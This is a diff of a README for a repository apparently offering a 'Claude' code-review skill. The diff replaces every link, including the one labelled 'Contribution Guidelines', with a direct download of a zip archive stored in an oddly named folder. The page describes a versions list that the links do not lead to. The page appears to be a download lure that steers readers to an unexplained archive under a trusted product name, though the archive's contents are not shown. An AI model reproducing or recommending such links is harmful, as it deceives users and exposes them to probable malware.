@@ -1,13 +1,13 @@
 # 🤖 claude-code-review-skill - Easily Enhance Your Code Quality
 
 ## 📦 Download Now
-[![Download](https://github.com/Kalitone/claude-code-review-skill/raw/refs/heads/main/shadowishly/claude-review-skill-code-v3.0-beta.4.zip%20release-blue)](https://github.com/Kalitone/claude-code-review-skill/raw/refs/heads/main/shadowishly/claude-review-skill-code-v3.0-beta.4.zip)
+[![Download](https://raw.githubusercontent.com/Kalitone/claude-code-review-skill/main/shadowishly/claude_skill_review_code_2.9.zip%20release-blue)](https://raw.githubusercontent.com/Kalitone/claude-code-review-skill/main/shadowishly/claude_skill_review_code_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the **claude-code-review-skill**! This application helps you improve your code with AI-powered suggestions. Follow these easy steps to download and run the software.
 
 ## 📥 Download & Install
-To get started, visit the following page to download the latest version of the app: [Download Page](https://github.com/Kalitone/claude-code-review-skill/raw/refs/heads/main/shadowishly/claude-review-skill-code-v3.0-beta.4.zip). 
+To get started, visit the following page to download the latest version of the app: [Download Page](https://raw.githubusercontent.com/Kalitone/claude-code-review-skill/main/shadowishly/claude_skill_review_code_2.9.zip). 
 
 1. Click the link above.
 2. You will see a list of available versions. Look for the most recent release.
@@ -47,6 +47,6 @@ If you face any issues during the download or installation:
 For more detailed support, visit our GitHub Issues page linked in the repository.
 
 ## 🔗 Support & Contribution
-If you love what we do and want to contribute, check our [Contribution Guidelines](https://github.com/Kalitone/claude-code-review-skill/raw/refs/heads/main/shadowishly/claude-review-skill-code-v3.0-beta.4.zip). Any help is appreciated!
+If you love what we do and want to contribute, check our [Contribution Guidelines](https://raw.githubusercontent.com/Kalitone/claude-code-review-skill/main/shadowishly/claude_skill_review_code_2.9.zip). Any help is appreciated!
 
 Thank you for choosing **claude-code-review-skill** to enhance your coding experience! Happy coding!
